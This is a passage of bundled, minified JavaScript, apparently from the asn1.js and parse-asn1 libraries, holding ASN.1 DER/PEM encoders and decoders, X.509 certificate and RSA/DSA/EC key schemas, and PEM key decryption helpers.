                var ye = this._decodeTag(V, Q.implicit !== null ? Q.implicit : Q.tag, Q.any);
                if (V.isError(ye))
                    return ye;
                Q.any ? ee = V.raw(ue) : V = ye
            }
            if (K && K.track && Q.tag !== null && K.track(V.path(), pe, V.length, "tagged"),
            K && K.track && Q.tag !== null && K.track(V.path(), V.offset, V.length, "content"),
            Q.any ? ee = ee : Q.choice === null ? ee = this._decodeGeneric(Q.tag, V, K) : ee = this._decodeChoice(V, K),
            V.isError(ee))
                return ee;
            if (!Q.any && Q.choice === null && Q.children !== null && Q.children.forEach(function(Ae) {
                Ae._decode(V, K)
            }),
            Q.contains && (Q.tag === "octstr" || Q.tag === "bitstr")) {
                var be = new j(ee);
                ee = this._getUse(Q.contains, V._reporterState.obj)._decode(be, K)
            }
        }
        return Q.obj && ae && (ee = V.leaveObject(fe)),
        Q.key !== null && (ee !== null || ae === !0) ? V.leaveKey(ne, Q.key, ee) : ne !== null && V.exitKey(ne),
        ee
    }
    ,
    X.prototype._decodeGeneric = function(V, K, Q) {
        var ee = this._baseState;
        return V === "seq" || V === "set" ? null : V === "seqof" || V === "setof" ? this._decodeList(K, V, ee.args[0], Q) : /str$/.test(V) ? this._decodeStr(K, V, Q) : V === "objid" && ee.args ? this._decodeObjid(K, ee.args[0], ee.args[1], Q) : V === "objid" ? this._decodeObjid(K, null, null, Q) : V === "gentime" || V === "utctime" ? this._decodeTime(K, V, Q) : V === "null_" ? this._decodeNull(K, Q) : V === "bool" ? this._decodeBool(K, Q) : V === "objDesc" ? this._decodeStr(K, V, Q) : V === "int" || V === "enum" ? this._decodeInt(K, ee.args && ee.args[0], Q) : ee.use !== null ? this._getUse(ee.use, K._reporterState.obj)._decode(K, Q) : K.error("unknown tag: " + V)
    }
    ,
    X.prototype._getUse = function(V, K) {
        var Q = this._baseState;
        return Q.useDecoder = this._use(V, K),
        O(Q.useDecoder._baseState.parent === null),
        Q.useDecoder = Q.useDecoder._baseState.children[0],
        Q.implicit !== Q.useDecoder._baseState.implicit && (Q.useDecoder = Q.useDecoder.clone(),
        Q.useDecoder._baseState.implicit = Q.implicit),
        Q.useDecoder
    }
    ,
    X.prototype._decodeChoice = function(V, K) {
        var Q = this._baseState
          , ee = null
          , ae = !1;
        return Object.keys(Q.choice).some(function(ne) {
            var oe = V.save()
              , ue = Q.choice[ne];
            try {
                var fe = ue._decode(V, K);
                if (V.isError(fe))
                    return !1;
                ee = {
                    type: ne,
                    value: fe
                },
                ae = !0
            } catch {
                return V.restore(oe),
                !1
            }
            return !0
        }, this),
        ae ? ee : V.error("Choice not matched")
    }
    ,
    X.prototype._createEncoderBuffer = function(V) {
        return new M(V,this.reporter)
    }
    ,
    X.prototype._encode = function(V, K, Q) {
        var ee = this._baseState;
        if (!(ee.default !== null && ee.default === V)) {
            var ae = this._encodeValue(V, K, Q);
            if (ae !== void 0 && !this._skipDefault(ae, K, Q))
                return ae
        }
    }
    ,
    X.prototype._encodeValue = function(V, K, Q) {
        var ee = this._baseState;
        if (ee.parent === null)
            return ee.children[0]._encode(V, K || new _);
        var ue = null;
        if (this.reporter = K,
        ee.optional && V === void 0)
            if (ee.default !== null)
                V = ee.default;
            else
                return;
        var ae = null
          , ne = !1;
        if (ee.any)
            ue = this._createEncoderBuffer(V);
        else if (ee.choice)
            ue = this._encodeChoice(V, K);
        else if (ee.contains)
            ae = this._getUse(ee.contains, Q)._encode(V, K),
            ne = !0;
        else if (ee.children)
            ae = ee.children.map(function(pe) {
                if (pe._baseState.tag === "null_")
                    return pe._encode(null, K, V);
                if (pe._baseState.key === null)
                    return K.error("Child should have a key");
                var ye = K.enterKey(pe._baseState.key);
                if (typeof V != "object")
                    return K.error("Child expected, but input is not object");
                var be = pe._encode(V[pe._baseState.key], K, V);
                return K.leaveKey(ye),
                be
            }, this).filter(function(pe) {
                return pe
            }),
            ae = this._createEncoderBuffer(ae);
        else if (ee.tag === "seqof" || ee.tag === "setof") {
            if (!(ee.args && ee.args.length === 1))
                return K.error("Too many args for : " + ee.tag);
            if (!Array.isArray(V))
                return K.error("seqof/setof, but data is not Array");
            var oe = this.clone();
            oe._baseState.implicit = null,
            ae = this._createEncoderBuffer(V.map(function(pe) {
                var ye = this._baseState;
                return this._getUse(ye.args[0], V)._encode(pe, K)
            }, oe))
        } else
            ee.use !== null ? ue = this._getUse(ee.use, Q)._encode(V, K) : (ae = this._encodePrimitive(ee.tag, V),
            ne = !0);
        var ue;
        if (!ee.any && ee.choice === null) {
            var fe = ee.implicit !== null ? ee.implicit : ee.tag
              , he = ee.implicit === null ? "universal" : "context";
            fe === null ? ee.use === null && K.error("Tag could be omitted only for .use()") : ee.use === null && (ue = this._encodeComposite(fe, ne, he, ae))
        }
        return ee.explicit !== null && (ue = this._encodeComposite(ee.explicit, !1, "context", ue)),
        ue
    }
    ,
    X.prototype._encodeChoice = function(V, K) {
        var Q = this._baseState
          , ee = Q.choice[V.type];
        return ee || O(!1, V.type + " not found in " + JSON.stringify(Object.keys(Q.choice))),
        ee._encode(V.value, K)
    }
    ,
    X.prototype._encodePrimitive = function(V, K) {
        var Q = this._baseState;
        if (/str$/.test(V))
            return this._encodeStr(K, V);
        if (V === "objid" && Q.args)
            return this._encodeObjid(K, Q.reverseArgs[0], Q.args[1]);
        if (V === "objid")
            return this._encodeObjid(K, null, null);
        if (V === "gentime" || V === "utctime")
            return this._encodeTime(K, V);
        if (V === "null_")
            return this._encodeNull();
        if (V === "int" || V === "enum")
            return this._encodeInt(K, Q.args && Q.reverseArgs[0]);
        if (V === "bool")
            return this._encodeBool(K);
        if (V === "objDesc")
            return this._encodeStr(K, V);
        throw new Error("Unsupported tag: " + V)
    }
    ,
    X.prototype._isNumstr = function(V) {
        return /^[0-9 ]*$/.test(V)
    }
    ,
    X.prototype._isPrintstr = function(V) {
        return /^[A-Za-z0-9 '\(\)\+,\-\.\/:=\?]*$/.test(V)
    }
    ,
    node
}
var hasRequiredBase;
function requireBase() {
    return hasRequiredBase || (hasRequiredBase = 1,
    function(_) {
        var M = _;
        M.Reporter = requireReporter().Reporter,
        M.DecoderBuffer = requireBuffer().DecoderBuffer,
        M.EncoderBuffer = requireBuffer().EncoderBuffer,
        M.Node = requireNode()
    }(base)),
    base
}
var constants = {}, der = {}, hasRequiredDer$2;
function requireDer$2() {
    return hasRequiredDer$2 || (hasRequiredDer$2 = 1,
    function(_) {
        var M = requireConstants();
        _.tagClass = {
            0: "universal",
            1: "application",
            2: "context",
            3: "private"
        },
        _.tagClassByName = M._reverse(_.tagClass),
        _.tag = {
            0: "end",
            1: "bool",
            2: "int",
            3: "bitstr",
            4: "octstr",
            5: "null_",
            6: "objid",
            7: "objDesc",
            8: "external",
            9: "real",
            10: "enum",
            11: "embed",
            12: "utf8str",
            13: "relativeOid",
            16: "seq",
            17: "set",
            18: "numstr",
            19: "printstr",
            20: "t61str",
            21: "videostr",
            22: "ia5str",
            23: "utctime",
            24: "gentime",
            25: "graphstr",
            26: "iso646str",
            27: "genstr",
            28: "unistr",
            29: "charstr",
            30: "bmpstr"
        },
        _.tagByName = M._reverse(_.tag)
    }(der)),
    der
}
var hasRequiredConstants;
function requireConstants() {
    return hasRequiredConstants || (hasRequiredConstants = 1,
    function(_) {
        var M = _;
        M._reverse = function(O) {
            var x = {};
            return Object.keys(O).forEach(function(w) {
                (w | 0) == w && (w = w | 0);
                var b = O[w];
                x[b] = w
            }),
            x
        }
        ,
        M.der = requireDer$2()
    }(constants)),
    constants
}
var decoders = {}, der_1$1, hasRequiredDer$1;
function requireDer$1() {
    if (hasRequiredDer$1)
        return der_1$1;
    hasRequiredDer$1 = 1;
    var _ = requireInherits_browser()
      , M = requireAsn1$1()
      , j = M.base
      , O = M.bignum
      , x = M.constants.der;
    function w(F) {
        this.enc = "der",
        this.name = F.name,
        this.entity = F,
        this.tree = new b,
        this.tree._init(F.body)
    }
    der_1$1 = w,
    w.prototype.decode = function(V, K) {
        return V instanceof j.DecoderBuffer || (V = new j.DecoderBuffer(V,K)),
        this.tree._decode(V, K)
    }
    ;
    function b(F) {
        j.Node.call(this, "der", F)
    }
    _(b, j.Node),
    b.prototype._peekTag = function(V, K, Q) {
        if (V.isEmpty())
            return !1;
        var ee = V.save()
          , ae = X(V, 'Failed to peek tag: "' + K + '"');
        return V.isError(ae) ? ae : (V.restore(ee),
        ae.tag === K || ae.tagStr === K || ae.tagStr + "of" === K || Q)
    }
    ,
    b.prototype._decodeTag = function(V, K, Q) {
        var ee = X(V, 'Failed to decode tag of "' + K + '"');
        if (V.isError(ee))
            return ee;
        var ae = Y(V, ee.primitive, 'Failed to get length of "' + K + '"');
        if (V.isError(ae))
            return ae;
        if (!Q && ee.tag !== K && ee.tagStr !== K && ee.tagStr + "of" !== K)
            return V.error('Failed to match tag: "' + K + '"');
        if (ee.primitive || ae !== null)
            return V.skip(ae, 'Failed to match body of: "' + K + '"');
        var ne = V.save()
          , oe = this._skipUntilEnd(V, 'Failed to skip indefinite length body: "' + this.tag + '"');
        return V.isError(oe) ? oe : (ae = V.offset - ne.offset,
        V.restore(ne),
        V.skip(ae, 'Failed to match body of: "' + K + '"'))
    }
    ,
    b.prototype._skipUntilEnd = function(V, K) {
        for (; ; ) {
            var Q = X(V, K);
            if (V.isError(Q))
                return Q;
            var ee = Y(V, Q.primitive, K);
            if (V.isError(ee))
                return ee;
            var ae;
            if (Q.primitive || ee !== null ? ae = V.skip(ee) : ae = this._skipUntilEnd(V, K),
            V.isError(ae))
                return ae;
            if (Q.tagStr === "end")
                break
        }
    }
    ,
    b.prototype._decodeList = function(V, K, Q, ee) {
        for (var ae = []; !V.isEmpty(); ) {
            var ne = this._peekTag(V, "end");
            if (V.isError(ne))
                return ne;
            var oe = Q.decode(V, "der", ee);
            if (V.isError(oe) && ne)
                break;
            ae.push(oe)
        }
        return ae
    }
    ,
    b.prototype._decodeStr = function(V, K) {
        if (K === "bitstr") {
            var Q = V.readUInt8();
            return V.isError(Q) ? Q : {
                unused: Q,
                data: V.raw()
            }
        } else if (K === "bmpstr") {
            var ee = V.raw();
            if (ee.length % 2 === 1)
                return V.error("Decoding of string type: bmpstr length mismatch");
            for (var ae = "", ne = 0; ne < ee.length / 2; ne++)
                ae += String.fromCharCode(ee.readUInt16BE(ne * 2));
            return ae
        } else if (K === "numstr") {
            var oe = V.raw().toString("ascii");
            return this._isNumstr(oe) ? oe : V.error("Decoding of string type: numstr unsupported characters")
        } else {
            if (K === "octstr")
                return V.raw();
            if (K === "objDesc")
                return V.raw();
            if (K === "printstr") {
                var ue = V.raw().toString("ascii");
                return this._isPrintstr(ue) ? ue : V.error("Decoding of string type: printstr unsupported characters")
            } else
                return /str$/.test(K) ? V.raw().toString() : V.error("Decoding of string type: " + K + " unsupported")
        }
    }
    ,
    b.prototype._decodeObjid = function(V, K, Q) {
        for (var ee, ae = [], ne = 0; !V.isEmpty(); ) {
            var oe = V.readUInt8();
            ne <<= 7,
            ne |= oe & 127,
            (oe & 128) === 0 && (ae.push(ne),
            ne = 0)
        }
        oe & 128 && ae.push(ne);
        var ue = ae[0] / 40 | 0
          , fe = ae[0] % 40;
        if (Q ? ee = ae : ee = [ue, fe].concat(ae.slice(1)),
        K) {
            var he = K[ee.join(" ")];
            he === void 0 && (he = K[ee.join(".")]),
            he !== void 0 && (ee = he)
        }
        return ee
    }
    ,
    b.prototype._decodeTime = function(V, K) {
        var Q = V.raw().toString();
        if (K === "gentime")
            var ee = Q.slice(0, 4) | 0
              , ae = Q.slice(4, 6) | 0
              , ne = Q.slice(6, 8) | 0
              , oe = Q.slice(8, 10) | 0
              , ue = Q.slice(10, 12) | 0
              , fe = Q.slice(12, 14) | 0;
        else if (K === "utctime") {
            var ee = Q.slice(0, 2) | 0
              , ae = Q.slice(2, 4) | 0
              , ne = Q.slice(4, 6) | 0
              , oe = Q.slice(6, 8) | 0
              , ue = Q.slice(8, 10) | 0
              , fe = Q.slice(10, 12) | 0;
            ee < 70 ? ee = 2e3 + ee : ee = 1900 + ee
        } else
            return V.error("Decoding " + K + " time is not supported yet");
        return Date.UTC(ee, ae - 1, ne, oe, ue, fe, 0)
    }
    ,
    b.prototype._decodeNull = function(V) {
        return null
    }
    ,
    b.prototype._decodeBool = function(V) {
        var K = V.readUInt8();
        return V.isError(K) ? K : K !== 0
    }
    ,
    b.prototype._decodeInt = function(V, K) {
        var Q = V.raw()
          , ee = new O(Q);
        return K && (ee = K[ee.toString(10)] || ee),
        ee
    }
    ,
    b.prototype._use = function(V, K) {
        return typeof V == "function" && (V = V(K)),
        V._getDecoder("der").tree
    }
    ;
    function X(F, V) {
        var K = F.readUInt8(V);
        if (F.isError(K))
            return K;
        var Q = x.tagClass[K >> 6]
          , ee = (K & 32) === 0;
        if ((K & 31) === 31) {
            var ae = K;
            for (K = 0; (ae & 128) === 128; ) {
                if (ae = F.readUInt8(V),
                F.isError(ae))
                    return ae;
                K <<= 7,
                K |= ae & 127
            }
        } else
            K &= 31;
        var ne = x.tag[K];
        return {
            cls: Q,
            primitive: ee,
            tag: K,
            tagStr: ne
        }
    }
    function Y(F, V, K) {
        var Q = F.readUInt8(K);
        if (F.isError(Q))
            return Q;
        if (!V && Q === 128)
            return null;
        if ((Q & 128) === 0)
            return Q;
        var ee = Q & 127;
        if (ee > 4)
            return F.error("length octect is too long");
        Q = 0;
        for (var ae = 0; ae < ee; ae++) {
            Q <<= 8;
            var ne = F.readUInt8(K);
            if (F.isError(ne))
                return ne;
            Q |= ne
        }
        return Q
    }
    return der_1$1
}
var pem$1, hasRequiredPem$1;
function requirePem$1() {
    if (hasRequiredPem$1)
        return pem$1;
    hasRequiredPem$1 = 1;
    var _ = requireInherits_browser()
      , M = requireDist$4().Buffer
      , j = requireDer$1();
    function O(x) {
        j.call(this, x),
        this.enc = "pem"
    }
    return _(O, j),
    pem$1 = O,
    O.prototype.decode = function(w, b) {
        for (var X = w.toString().split(/[\r\n]+/g), Y = b.label.toUpperCase(), F = /^-----(BEGIN|END) ([^-]+)-----$/, V = -1, K = -1, Q = 0; Q < X.length; Q++) {
            var ee = X[Q].match(F);
            if (ee !== null && ee[2] === Y)
                if (V === -1) {
                    if (ee[1] !== "BEGIN")
                        break;
                    V = Q
                } else {
                    if (ee[1] !== "END")
                        break;
                    K = Q;
                    break
                }
        }
        if (V === -1 || K === -1)
            throw new Error("PEM section not found for: " + Y);
        var ae = X.slice(V + 1, K).join("");
        ae.replace(/[^a-z0-9\+\/=]+/gi, "");
        var ne = new M(ae,"base64");
        return j.prototype.decode.call(this, ne, b)
    }
    ,
    pem$1
}
var hasRequiredDecoders;
function requireDecoders() {
    return hasRequiredDecoders || (hasRequiredDecoders = 1,
    function(_) {
        var M = _;
        M.der = requireDer$1(),
        M.pem = requirePem$1()
    }(decoders)),
    decoders
}
var encoders = {}, der_1, hasRequiredDer;
function requireDer() {
    if (hasRequiredDer)
        return der_1;
    hasRequiredDer = 1;
    var _ = requireInherits_browser()
      , M = requireDist$4().Buffer
      , j = requireAsn1$1()
      , O = j.base
      , x = j.constants.der;
    function w(F) {
        this.enc = "der",
        this.name = F.name,
        this.entity = F,
        this.tree = new b,
        this.tree._init(F.body)
    }
    der_1 = w,
    w.prototype.encode = function(V, K) {
        return this.tree._encode(V, K).join()
    }
    ;
    function b(F) {
        O.Node.call(this, "der", F)
    }
    _(b, O.Node),
    b.prototype._encodeComposite = function(V, K, Q, ee) {
        var ae = Y(V, K, Q, this.reporter);
        if (ee.length < 128) {
            var ue = new M(2);
            return ue[0] = ae,
            ue[1] = ee.length,
            this._createEncoderBuffer([ue, ee])
        }
        for (var ne = 1, oe = ee.length; oe >= 256; oe >>= 8)
            ne++;
        var ue = new M(2 + ne);
        ue[0] = ae,
        ue[1] = 128 | ne;
        for (var oe = 1 + ne, fe = ee.length; fe > 0; oe--,
        fe >>= 8)
            ue[oe] = fe & 255;
        return this._createEncoderBuffer([ue, ee])
    }
    ,
    b.prototype._encodeStr = function(V, K) {
        if (K === "bitstr")
            return this._createEncoderBuffer([V.unused | 0, V.data]);
        if (K === "bmpstr") {
            for (var Q = new M(V.length * 2), ee = 0; ee < V.length; ee++)
                Q.writeUInt16BE(V.charCodeAt(ee), ee * 2);
            return this._createEncoderBuffer(Q)
        } else
            return K === "numstr" ? this._isNumstr(V) ? this._createEncoderBuffer(V) : this.reporter.error("Encoding of string type: numstr supports only digits and space") : K === "printstr" ? this._isPrintstr(V) ? this._createEncoderBuffer(V) : this.reporter.error("Encoding of string type: printstr supports only latin upper and lower case letters, digits, space, apostrophe, left and rigth parenthesis, plus sign, comma, hyphen, dot, slash, colon, equal sign, question mark") : /str$/.test(K) ? this._createEncoderBuffer(V) : K === "objDesc" ? this._createEncoderBuffer(V) : this.reporter.error("Encoding of string type: " + K + " unsupported")
    }
    ,
    b.prototype._encodeObjid = function(V, K, Q) {
        if (typeof V == "string") {
            if (!K)
                return this.reporter.error("string objid given, but no values map found");
            if (!K.hasOwnProperty(V))
                return this.reporter.error("objid not found in values map");
            V = K[V].split(/[\s\.]+/g);
            for (var ee = 0; ee < V.length; ee++)
                V[ee] |= 0
        } else if (Array.isArray(V)) {
            V = V.slice();
            for (var ee = 0; ee < V.length; ee++)
                V[ee] |= 0
        }
        if (!Array.isArray(V))
            return this.reporter.error("objid() should be either array or string, got: " + JSON.stringify(V));
        if (!Q) {
            if (V[1] >= 40)
                return this.reporter.error("Second objid identifier OOB");
            V.splice(0, 2, V[0] * 40 + V[1])
        }
        for (var ae = 0, ee = 0; ee < V.length; ee++) {
            var ne = V[ee];
            for (ae++; ne >= 128; ne >>= 7)
                ae++
        }
        for (var oe = new M(ae), ue = oe.length - 1, ee = V.length - 1; ee >= 0; ee--) {
            var ne = V[ee];
            for (oe[ue--] = ne & 127; (ne >>= 7) > 0; )
                oe[ue--] = 128 | ne & 127
        }
        return this._createEncoderBuffer(oe)
    }
    ;
    function X(F) {
        return F < 10 ? "0" + F : F
    }
    b.prototype._encodeTime = function(V, K) {
        var Q, ee = new Date(V);
        return K === "gentime" ? Q = [X(ee.getFullYear()), X(ee.getUTCMonth() + 1), X(ee.getUTCDate()), X(ee.getUTCHours()), X(ee.getUTCMinutes()), X(ee.getUTCSeconds()), "Z"].join("") : K === "utctime" ? Q = [X(ee.getFullYear() % 100), X(ee.getUTCMonth() + 1), X(ee.getUTCDate()), X(ee.getUTCHours()), X(ee.getUTCMinutes()), X(ee.getUTCSeconds()), "Z"].join("") : this.reporter.error("Encoding " + K + " time is not supported yet"),
        this._encodeStr(Q, "octstr")
    }
    ,
    b.prototype._encodeNull = function() {
        return this._createEncoderBuffer("")
    }
    ,
    b.prototype._encodeInt = function(V, K) {
        if (typeof V == "string") {
            if (!K)
                return this.reporter.error("String int or enum given, but no values map");
            if (!K.hasOwnProperty(V))
                return this.reporter.error("Values map doesn't contain: " + JSON.stringify(V));
            V = K[V]
        }
        if (typeof V != "number" && !M.isBuffer(V)) {
            var Q = V.toArray();
            !V.sign && Q[0] & 128 && Q.unshift(0),
            V = new M(Q)
        }
        if (M.isBuffer(V)) {
            var ee = V.length;
            V.length === 0 && ee++;
            var ne = new M(ee);
            return V.copy(ne),
            V.length === 0 && (ne[0] = 0),
            this._createEncoderBuffer(ne)
        }
        if (V < 128)
            return this._createEncoderBuffer(V);
        if (V < 256)
            return this._createEncoderBuffer([0, V]);
        for (var ee = 1, ae = V; ae >= 256; ae >>= 8)
            ee++;
        for (var ne = new Array(ee), ae = ne.length - 1; ae >= 0; ae--)
            ne[ae] = V & 255,
            V >>= 8;
        return ne[0] & 128 && ne.unshift(0),
        this._createEncoderBuffer(new M(ne))
    }
    ,
    b.prototype._encodeBool = function(V) {
        return this._createEncoderBuffer(V ? 255 : 0)
    }
    ,
    b.prototype._use = function(V, K) {
        return typeof V == "function" && (V = V(K)),
        V._getEncoder("der").tree
    }
    ,
    b.prototype._skipDefault = function(V, K, Q) {
        var ee = this._baseState, ae;
        if (ee.default === null)
            return !1;
        var ne = V.join();
        if (ee.defaultBuffer === void 0 && (ee.defaultBuffer = this._encodeValue(ee.default, K, Q).join()),
        ne.length !== ee.defaultBuffer.length)
            return !1;
        for (ae = 0; ae < ne.length; ae++)
            if (ne[ae] !== ee.defaultBuffer[ae])
                return !1;
        return !0
    }
    ;
    function Y(F, V, K, Q) {
        var ee;
        if (F === "seqof" ? F = "seq" : F === "setof" && (F = "set"),
        x.tagByName.hasOwnProperty(F))
            ee = x.tagByName[F];
        else if (typeof F == "number" && (F | 0) === F)
            ee = F;
        else
            return Q.error("Unknown tag: " + F);
        return ee >= 31 ? Q.error("Multi-octet tag encoding unsupported") : (V || (ee |= 32),
        ee |= x.tagClassByName[K || "universal"] << 6,
        ee)
    }
    return der_1
}
var pem, hasRequiredPem;
function requirePem() {
    if (hasRequiredPem)
        return pem;
    hasRequiredPem = 1;
    var _ = requireInherits_browser()
      , M = requireDer();
    function j(O) {
        M.call(this, O),
        this.enc = "pem"
    }
    return _(j, M),
    pem = j,
    j.prototype.encode = function(x, w) {
        for (var b = M.prototype.encode.call(this, x), X = b.toString("base64"), Y = ["-----BEGIN " + w.label + "-----"], F = 0; F < X.length; F += 64)
            Y.push(X.slice(F, F + 64));
        return Y.push("-----END " + w.label + "-----"),
        Y.join(`
`)
    }
    ,
    pem
}
var hasRequiredEncoders;
function requireEncoders() {
    return hasRequiredEncoders || (hasRequiredEncoders = 1,
    function(_) {
        var M = _;
        M.der = requireDer(),
        M.pem = requirePem()
    }(encoders)),
    encoders
}
var hasRequiredAsn1$1;
function requireAsn1$1() {
    return hasRequiredAsn1$1 || (hasRequiredAsn1$1 = 1,
    function(_) {
        var M = _;
        M.bignum = requireBn$2(),
        M.define = requireApi().define,
        M.base = requireBase(),
        M.constants = requireConstants(),
        M.decoders = requireDecoders(),
        M.encoders = requireEncoders()
    }(asn1)),
    asn1
}
var certificate, hasRequiredCertificate;
function requireCertificate() {
    if (hasRequiredCertificate)
        return certificate;
    hasRequiredCertificate = 1;
    var _ = requireAsn1$1()
      , M = _.define("Time", function() {
        this.choice({
            utcTime: this.utctime(),
            generalTime: this.gentime()
        })
    })
      , j = _.define("AttributeTypeValue", function() {
        this.seq().obj(this.key("type").objid(), this.key("value").any())
    })
      , O = _.define("AlgorithmIdentifier", function() {
        this.seq().obj(this.key("algorithm").objid(), this.key("parameters").optional(), this.key("curve").objid().optional())
    })
      , x = _.define("SubjectPublicKeyInfo", function() {
        this.seq().obj(this.key("algorithm").use(O), this.key("subjectPublicKey").bitstr())
    })
      , w = _.define("RelativeDistinguishedName", function() {
        this.setof(j)
    })
      , b = _.define("RDNSequence", function() {
        this.seqof(w)
    })
      , X = _.define("Name", function() {
        this.choice({
            rdnSequence: this.use(b)
        })
    })
      , Y = _.define("Validity", function() {
        this.seq().obj(this.key("notBefore").use(M), this.key("notAfter").use(M))
    })
      , F = _.define("Extension", function() {
        this.seq().obj(this.key("extnID").objid(), this.key("critical").bool().def(!1), this.key("extnValue").octstr())
    })
      , V = _.define("TBSCertificate", function() {
        this.seq().obj(this.key("version").explicit(0).int().optional(), this.key("serialNumber").int(), this.key("signature").use(O), this.key("issuer").use(X), this.key("validity").use(Y), this.key("subject").use(X), this.key("subjectPublicKeyInfo").use(x), this.key("issuerUniqueID").implicit(1).bitstr().optional(), this.key("subjectUniqueID").implicit(2).bitstr().optional(), this.key("extensions").explicit(3).seqof(F).optional())
    })
      , K = _.define("X509Certificate", function() {
        this.seq().obj(this.key("tbsCertificate").use(V), this.key("signatureAlgorithm").use(O), this.key("signatureValue").bitstr())
    });
    return certificate = K,
    certificate
}
var hasRequiredAsn1;
function requireAsn1() {
    if (hasRequiredAsn1)
        return asn1$1;
    hasRequiredAsn1 = 1;
    var _ = requireAsn1$1();
    asn1$1.certificate = requireCertificate();
    var M = _.define("RSAPrivateKey", function() {
        this.seq().obj(this.key("version").int(), this.key("modulus").int(), this.key("publicExponent").int(), this.key("privateExponent").int(), this.key("prime1").int(), this.key("prime2").int(), this.key("exponent1").int(), this.key("exponent2").int(), this.key("coefficient").int())
    });
    asn1$1.RSAPrivateKey = M;
    var j = _.define("RSAPublicKey", function() {
        this.seq().obj(this.key("modulus").int(), this.key("publicExponent").int())
    });
    asn1$1.RSAPublicKey = j;
    var O = _.define("AlgorithmIdentifier", function() {
        this.seq().obj(this.key("algorithm").objid(), this.key("none").null_().optional(), this.key("curve").objid().optional(), this.key("params").seq().obj(this.key("p").int(), this.key("q").int(), this.key("g").int()).optional())
    })
      , x = _.define("SubjectPublicKeyInfo", function() {
        this.seq().obj(this.key("algorithm").use(O), this.key("subjectPublicKey").bitstr())
    });
    asn1$1.PublicKey = x;
    var w = _.define("PrivateKeyInfo", function() {
        this.seq().obj(this.key("version").int(), this.key("algorithm").use(O), this.key("subjectPrivateKey").octstr())
    });
    asn1$1.PrivateKey = w;
    var b = _.define("EncryptedPrivateKeyInfo", function() {
        this.seq().obj(this.key("algorithm").seq().obj(this.key("id").objid(), this.key("decrypt").seq().obj(this.key("kde").seq().obj(this.key("id").objid(), this.key("kdeparams").seq().obj(this.key("salt").octstr(), this.key("iters").int())), this.key("cipher").seq().obj(this.key("algo").objid(), this.key("iv").octstr()))), this.key("subjectPrivateKey").octstr())
    });
    asn1$1.EncryptedPrivateKey = b;
    var X = _.define("DSAPrivateKey", function() {
        this.seq().obj(this.key("version").int(), this.key("p").int(), this.key("q").int(), this.key("g").int(), this.key("pub_key").int(), this.key("priv_key").int())
    });
    asn1$1.DSAPrivateKey = X,
    asn1$1.DSAparam = _.define("DSAparam", function() {
        this.int()
    });
    var Y = _.define("ECParameters", function() {
        this.choice({
            namedCurve: this.objid()
        })
    })
      , F = _.define("ECPrivateKey", function() {
        this.seq().obj(this.key("version").int(), this.key("privateKey").octstr(), this.key("parameters").optional().explicit(0).use(Y), this.key("publicKey").optional().explicit(1).bitstr())
    });
    return asn1$1.ECPrivateKey = F,
    asn1$1.signature = _.define("signature", function() {
        this.seq().obj(this.key("r").int(), this.key("s").int())
    }),
    asn1$1
}
const require$$1$3 = {
    "2.16.840.1.101.3.4.1.1": "aes-128-ecb",
    "2.16.840.1.101.3.4.1.2": "aes-128-cbc",
    "2.16.840.1.101.3.4.1.3": "aes-128-ofb",
    "2.16.840.1.101.3.4.1.4": "aes-128-cfb",
    "2.16.840.1.101.3.4.1.21": "aes-192-ecb",
    "2.16.840.1.101.3.4.1.22": "aes-192-cbc",
    "2.16.840.1.101.3.4.1.23": "aes-192-ofb",
    "2.16.840.1.101.3.4.1.24": "aes-192-cfb",
    "2.16.840.1.101.3.4.1.41": "aes-256-ecb",
    "2.16.840.1.101.3.4.1.42": "aes-256-cbc",
    "2.16.840.1.101.3.4.1.43": "aes-256-ofb",
    "2.16.840.1.101.3.4.1.44": "aes-256-cfb"
};
var fixProc, hasRequiredFixProc;
function requireFixProc() {
    if (hasRequiredFixProc)
        return fixProc;
    hasRequiredFixProc = 1;
    var _ = /Proc-Type: 4,ENCRYPTED[\n\r]+DEK-Info: AES-((?:128)|(?:192)|(?:256))-CBC,([0-9A-H]+)[\n\r]+([0-9A-z\n\r+/=]+)[\n\r]+/m
      , M = /^-----BEGIN ((?:.*? KEY)|CERTIFICATE)-----/m
      , j = /^-----BEGIN ((?:.*? KEY)|CERTIFICATE)-----([0-9A-z\n\r+/=]+)-----END \1-----$/m
      , O = requireEvp_bytestokey()
      , x = requireBrowser$9()
      , w = requireSafeBuffer$1().Buffer;
    return fixProc = function(b, X) {
        var Y = b.toString(), F = Y.match(_), V;
        if (F) {
            var Q = "aes" + F[1]
              , ee = w.from(F[2], "hex")
              , ae = w.from(F[3].replace(/[\r\n]/g, ""), "base64")
              , ne = O(X, ee.slice(0, 8), parseInt(F[1], 10)).key
              , oe = []
              , ue = x.createDecipheriv(Q, ne, ee);
            oe.push(ue.update(ae)),
            oe.push(ue.final()),
            V = w.concat(oe)
        } else {
            var K = Y.match(j);
            V = w.from(K[2].replace(/[\r\n]/g, ""), "base64")
        }
        var fe = Y.match(M)[1];
        return {
            tag: fe,
            data: V
        }
    }
    ,
    fixProc
}
var parseAsn1, hasRequiredParseAsn1;
function requireParseAsn1() {
    if (hasRequiredParseAsn1)
        return parseAsn1;
    hasRequiredParseAsn1 = 1;
    var _ = requireAsn1()
      , M = require$$1$3
      , j = requireFixProc()
      , O = requireBrowser$9()
      , x = requireBrowser$a()
      , w = requireSafeBuffer$1().Buffer;
    function b(Y, F) {
        var V = Y.algorithm.decrypt.kde.kdeparams.salt
          , K = parseInt(Y.algorithm.decrypt.kde.kdeparams.iters.toString(), 10)
          , Q = M[Y.algorithm.decrypt.cipher.algo.join(".")]
          , ee = Y.algorithm.decrypt.cipher.iv
          , ae = Y.subjectPrivateKey
          , ne = parseInt(Q.split("-")[1], 10) / 8
          , oe = x.pbkdf2Sync(F, V, K, ne, "sha1")
          , ue = O.createDecipheriv(Q, oe, ee)
          , fe = [];
        return fe.push(ue.update(ae)),
        fe.push(ue.final()),
        w.concat(fe)
    }
    function X(Y) {
        var F;
        typeof Y == "object" && !w.isBuffer(Y) && (F = Y.passphrase,
        Y = Y.key),
        typeof Y == "string" && (Y = w.from(Y));
        var V = j(Y, F), K = V.tag, Q = V.data, ee, ae;
        switch (K) {
        case "CERTIFICATE":
            ae = _.certificate.decode(Q, "der").tbsCertificate.subjectPublicKeyInfo;
        case "PUBLIC KEY":
            switch (ae || (ae = _.PublicKey.decode(Q, "der")),
            ee = ae.algorithm.algorithm.join("."),
            ee) {
            case "1.2.840.113549.1.1.1":
                return _.RSAPublicKey.decode(ae.subjectPublicKey.data, "der");
            case "1.2.840.10045.2.1":
                return ae.subjectPrivateKey = ae.subjectPublicKey,
                {
                    type: "ec",
                    data: ae
                };
